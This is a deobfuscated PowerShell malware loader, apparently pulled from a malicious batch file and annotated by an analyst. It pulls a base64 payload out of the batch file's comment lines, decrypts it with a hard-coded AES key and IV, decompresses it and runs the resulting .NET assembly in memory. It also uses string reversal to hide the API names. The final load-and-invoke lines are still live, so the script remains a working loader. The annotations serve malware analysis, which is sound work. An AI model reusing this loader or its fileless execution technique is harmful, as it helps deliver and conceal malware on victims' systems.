# Deobfuscated with ❤️ from Malware Guy - do not run on your system!
# This was the PowerShell script located from the Batch file

# Retrieve the .NET payload - this looks through the Batch script for any lines starting with ':: '
$original_script = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\Malware Guy\Downloads\Sample 2\streams\4\stream_4_cleaned.bat').Split([Environment]::NewLine);
foreach ($obf_assembly_from_script in $original_script)
{
    if ($obf_assembly_from_script.StartsWith(':: '))
    {
        $obfuscated_assembly = $obf_assembly_from_script.Substring(3);
        break;
    };
};

# After loading the .NET assembly, decode it from base64 then decrypt it using AES. The key and IV are also obfuscated
$payload = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($obfuscated_assembly); # FromBase64String
$aESDecryptionProvider = New-Object System.Security.Cryptography.AesManaged;
$aESDecryptionProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$aESDecryptionProvider.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$aESDecryptionProvider.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('yYekebeFAe7ren5BiCYSSPJnC2uH+2H1CTltH0QZMKE='); # \xc9\x87\xa4\x79\xb7\x85\x01\xee\xeb\x7a\x7e\x41\x88\x26\x12\x48\xf2\x67\x0b\x6b\x87\xfb\x61\xf5\x09\x39\x6d\x1f\x44\x19\x30\xa1
$aESDecryptionProvider.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('DYxD3VupLpdS9dH3W1vc/w=='); # \x0d\x8c\x43\xdd\x5b\xa9\x2e\x97\x52\xf5\xd1\xf7\x5b\x5b\xdc\xff
$aesDecryptor = $aESDecryptionProvider.CreateDecryptor();
$payload = $aesDecryptor.TransformFinalBlock($payload, 0, $payload.Length);
$aesDecryptor.Dispose();
$aESDecryptionProvider.Dispose();

# Decompress the assembly using Gzip
$memorystream1 = New-Object System.IO.MemoryStream(, $payload);
$memorystream2 = New-Object System.IO.MemoryStream;
$gzip_decompressed_payload = New-Object System.IO.Compression.GZipStream($memorystream1, [IO.Compression.CompressionMode]::Decompress);
$gzip_decompressed_payload.CopyTo($memorystream2);
$gzip_decompressed_payload.Dispose();
$memorystream1.Dispose();
$memorystream2.Dispose();
$payload = $memorystream2.ToArray();

# At this point, the payload would be ready - the next commented command would dump the deobfuscated PE file to disk
# [io.file]::WriteAllBytes('.\dump.bin',$payload)
$assembly_payload = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($payload);
$assembly_entrypoint = $assembly_payload.EntryPoint;
$assembly_entrypoint.Invoke($null, (, [string[]] ('')))
